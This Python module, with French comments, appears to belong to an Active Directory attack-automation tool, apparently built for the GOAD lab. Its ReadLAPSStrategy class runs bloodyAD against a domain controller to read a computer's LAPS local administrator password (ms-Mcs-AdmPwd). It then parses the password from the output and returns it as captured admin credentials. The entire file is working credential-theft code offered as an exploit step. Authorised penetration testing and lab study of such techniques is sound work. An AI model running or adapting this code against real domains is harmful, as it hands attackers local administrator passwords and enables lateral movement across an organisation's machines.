# strategies/read_laps.py
import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class ReadLAPSStrategy(ExploitStrategy):
    """
    ReadLAPSPassword — Le compte source a le droit de lire
    ms-Mcs-AdmPwd sur la machine cible.
    Outil : bloodyAD
    """
    def can_exploit(self, edge: Edge) -> bool:
        return edge.kind.name == "READ_LAPS_PASS"
    def describe(self, edge: Edge) -> str:
        return (
            f"[ReadLAPS] {edge.source_node.label} peut lire le mot de passe "
            f"administrateur local LAPS de {edge.goal_node.label}"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        computer = edge.goal_node.label  # ex: KINGSLANDING.SEVENKINGDOMS.LOCAL

        cmd = [
            "bloodyAD",
            "--host", dc_ip,
            "-d", domain,
            "-u", username,
            "-p", password,
            "get", "object", computer,
            "--attr", "ms-Mcs-AdmPwd"
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=15
            )
            output = result.stdout + result.stderr

            # Cherche le mot de passe dans la sortie
            laps_password = None
            for line in output.splitlines():
                if "ms-Mcs-AdmPwd" in line and ":" in line:
                    laps_password = line.split(":", 1)[1].strip()
                    break

            if laps_password:
                return {
                    "success": True,
                    "output": output,
                    "credentials": {
                        "type":     "local_admin",
                        "target":   computer,
                        "username": "Administrator",
                        "password": laps_password,
                    }
                }

            return {"success": False, "output": output, "credentials": None}

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "bloodyAD introuvable. pip install bloodyAD", "credentials": None}